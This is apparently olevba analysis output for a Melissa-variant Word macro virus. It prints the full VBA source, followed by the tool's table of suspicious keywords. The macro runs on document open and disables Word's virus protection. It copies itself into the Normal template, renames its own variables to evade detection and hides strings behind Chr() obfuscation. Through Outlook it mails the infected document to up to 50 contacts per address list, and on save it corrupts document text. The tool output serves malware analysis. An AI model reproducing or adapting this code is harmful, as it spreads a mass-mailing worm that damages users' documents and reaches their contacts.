olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Melissa.p-a8da49353293e5f0fa214a0d5fd83e11ba703986
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Melissa.p-a8da49353293e5f0fa214a0d5fd83e11ba703986 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
Options.ConfirmConversions = 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
I830 = Chr(69) + Chr(99) + Chr(108) + Chr(105) + Chr(112) + Chr(115) + Chr(101)
If System.ProfileString("", I830) = Empty Then System.ProfileString("", I830) = Str(0)
If ActiveDocument.Words.Count <= 5 Then Exit Sub
With ActiveDocument.VBProject.VBComponents
F280 = .Item(1).CodeModule.CountOfLines
If Left(.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
Set M848 = .Item(1)
K353 = True
System.ProfileString("", I830) = Str(Val(System.ProfileString("", I830)) + 1)
End If
End With
With NormalTemplate.VBProject.VBComponents
U182 = .Item(1).CodeModule.CountOfLines
If Left(.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
Set M848 = .Item(1)
S441 = True
System.ProfileString("", I830) = Str(Val(System.ProfileString("", I830)) + 1)
Call C545_P878
End If
End With
If S441 <> True And K353 <> True Then GoTo B474
If S441 = True Then M848.CodeModule.AddFromString (Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(65) + Chr(117) + Chr(116) + Chr(111) + Chr(67) + Chr(108) + Chr(111) + Chr(115) + Chr(101) + Chr(40) + Chr(41) & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, F280 - 1))
If K353 = True Then M848.CodeModule.AddFromString (Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(65) + Chr(117) + Chr(116) + Chr(111) + Chr(79) + Chr(112) + Chr(101) + Chr(110) + Chr(40) + Chr(41) & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, U182 - 1))
B474:
If Val(System.ProfileString("", I830)) = 5 Then
Dim U398, D464, A346, C367, K990
Set U398 = CreateObject(Chr(79) + Chr(117) + Chr(116) + Chr(108) + Chr(111) + Chr(111) + Chr(107) + Chr(46) + Chr(65) + Chr(112) + Chr(112) + Chr(108) + Chr(105) + Chr(99) + Chr(97) + Chr(116) + Chr(105) + Chr(111) + Chr(110))
Set D464 = U398.GetNameSpace("MAPI")
If U398 = "Outlook" Then
    With ActiveDocument
    If .Saved = False Then
        .Save
        If .Saved = False Then Exit Sub
    End If
    End With
    D464.Logon Chr(112) + Chr(114) + Chr(111) + Chr(102) + Chr(105) + Chr(108) + Chr(101), Chr(112) + Chr(97) + Chr(115) + Chr(115) + Chr(119) + Chr(111) + Chr(114) + Chr(100)
    For Y = 1 To D464.AddressLists.Count
        Set C831 = D464.AddressLists(Y)
        x = 1
        Set A346 = U398.CreateItem(0)
        For oo = 1 To C831.AddressEntries.Count
            C367 = C831.AddressEntries(x)
            A346.Recipients.Add C367
            x = x + 1
            If x > 50 Then oo = C831.AddressEntries.Count
         Next oo
         A346.Subject = Chr(77) + Chr(101) + Chr(115) + Chr(115) + Chr(97) + Chr(103) + Chr(101) + Chr(32) + Chr(70) + Chr(114) + Chr(111) + Chr(109) + Chr(32) & Application.UserName
         A346.Body = Chr(72) + Chr(101) + Chr(114) + Chr(101) + Chr(32) + Chr(105) + Chr(115) + Chr(32) + Chr(116) + Chr(104) + Chr(97) + Chr(116) + Chr(32) + Chr(100) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(32) + Chr(121) + Chr(111) + Chr(117) + Chr(32) + Chr(97) + Chr(115) + Chr(107) + Chr(101) + Chr(100) + Chr(32) + Chr(102) + Chr(111) + Chr(114) + Chr(46) + Chr(32) + Chr(32) + Chr(72) + Chr(111) + Chr(112) + Chr(101) + Chr(32) + Chr(121) + Chr(111) + Chr(117) + Chr(32) + Chr(101) + Chr(110) + Chr(106) + Chr(111) + Chr(121) + Chr(32) + Chr(105) + Chr(116) + Chr(32) + Chr(59) + Chr(45) + Chr(41)
         A346.Attachments.Add ActiveDocument.FullName
         A346.Send
         C367 = ""
         Next Y
    D464.Logoff
    U398.Application.Quit
    U398 = Nothing
  End If
End If
If U182 <> 0 And F280 = 0 Then
    If ActiveDocument.Saved = False Then
        ActiveDocument.Save
    End If
End If
End Sub

'Sub ToolsMacro()
'D15
'End Sub

'Sub ViewVBCode()
'D15
'End Sub

'Sub FileTemplates()
'D15
'End Sub

Private Sub D15()
msg = Chr(84) + Chr(104) + Chr(105) + Chr(115) + Chr(32) + Chr(112) + Chr(114) + Chr(111) + Chr(103) + Chr(114) + Chr(97) + Chr(109) + Chr(32) + Chr(104) + Chr(97) + Chr(115) + Chr(32) + Chr(112) + Chr(101) + Chr(114) + Chr(102) + Chr(111) + Chr(114) + Chr(109) + Chr(101) + Chr(100) + Chr(32) + Chr(97) + Chr(110) + Chr(32) + Chr(105) + Chr(108) + Chr(108) + Chr(101) + Chr(103) + Chr(97) + Chr(108) + Chr(32) + Chr(111) + Chr(112) + Chr(101) + Chr(114) + Chr(97) + Chr(116) + Chr(105) + Chr(111) + Chr(110) + Chr(32) + Chr(97) + Chr(110) + Chr(100) + Chr(32) + Chr(119) + Chr(105) + Chr(108) + Chr(108) + Chr(32) + Chr(115) + Chr(104) + Chr(117) + Chr(116) + Chr(32) + Chr(100) + Chr(111) + Chr(119) + Chr(110) + Chr(46)
MsgBox msg, vbCritical, Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(32) + Chr(87) + Chr(111) + Chr(114) + Chr(100)
End Sub

Private Sub C545_P878()
On Error Resume Next
Randomize Timer
Dim A773(0 To 24) As String
A773(0) = "A773"
A773(1) = "I264": A773(2) = "D861": A773(3) = "R351": A773(4) = "H336": A773(5) = "P878": A773(6) = "F280"
A773(7) = "U182": A773(8) = "K353":: A773(9) = "M848": A773(10) = "S441": A773(11) = "B474": A773(12) = "C545": A773(13) = "J684": A773(14) = "U919"
A773(15) = "U398": A773(16) = "D464": A773(17) = "A346": A773(18) = "C367": A773(19) = "C831": A773(20) = "K990": A773(21) = "F749": A773(22) = "D15"
A773(23) = "I851": A773(24) = "I830"
For x = 0 To 24
a1 = (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 1000)
Call P878(a1, A773(x))
Next x
End Sub

Private Sub P878(U919, J684 As String)
On Error Resume Next
Dim I264 As Long: Dim D861 As Long: Dim R351 As Long: Dim H336 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
I264 = 1: D861 = 1: R351 = .CountOfLines: H336 = Len(.Lines(.CountOfLines, 1))
Do While .Find(J684, I264, D861, R351, H336, True)
strline = .Lines(I264, 1)
strline = Left(strline, D861 - 1) & U919 & Mid(strline, H336)
.ReplaceLine I264, strline
I264 = R351 + 1: D861 = 1: DD2134 = .CountOfLines
H336 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Sub

Sub FileSave()
On Error Resume Next
ActiveDocument.Save
If ActiveDocument.Words.Count <= 5 And Day(Now()) <> 13 Then Exit Sub
Set F749 = ActiveDocument.Content
With F749.Find
    .ClearFormatting
    .Replacement.ClearFormatting
    .MatchWholeWord = True
    .Execute FindText:=".", ReplaceWith:=",", Replace:=wdReplaceAll
    .Execute FindText:="a", ReplaceWith:="e", Replace:=wdReplaceAll
    .Execute FindText:="and", ReplaceWith:="not", Replace:=wdReplaceAll
End With
msg = vbCrLf + Chr(89) + Chr(111) + Chr(117) + Chr(39) + Chr(118) + Chr(101) + Chr(32) + Chr(98) + Chr(101) + Chr(101) + Chr(110) + Chr(32) + Chr(69) + Chr(99) + Chr(108) + Chr(105) + Chr(112) + Chr(115) + Chr(101) + Chr(100) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(77) + Chr(77) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(36) + Chr(36) + Chr(77) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(77) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(36) + Chr(36) + Chr(36) + Chr(77) + Chr(77) + Chr(77) + Chr(33) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(36) + Chr(36) + Chr(36) + Chr(77) + Chr(33) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(36) + Chr(36) + Chr(36) + Chr(77) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(36) + Chr(36) + Chr(36) + Chr(77) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(36) + Chr(36) + Chr(36) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(36) + Chr(36) + Chr(36) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(77) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(126) + Chr(126) + Chr(33) + Chr(36) + Chr(77) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(126) + Chr(33) + Chr(77) + Chr(36) + Chr(77) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(77) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(77) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(36) + Chr(36) + Chr(36) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(77) + Chr(33) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(36) + Chr(36) + Chr(36) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(77) + Chr(33) + Chr(33) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(33) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(77) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(126) + Chr(126) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126)
msg = msg + vbCrLf + Chr(126) + Chr(126) + Chr(126) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(32) + Chr(32) + Chr(32) + Chr(126) + Chr(126)
Set myR = ActiveDocument.Range(ActiveDocument.Content.End - 1, ActiveDocument.Content.End)
myR.InsertAfter msg
myR.Font.Name = "Courier New"
ActiveDocument.Save
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |G~u                 |R351                                         |
|String    |                    |                                             |
|Base64    |S_6                 |U182                                         |
|String    |                    |                                             |
|Base64    |+~w                 |K353                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

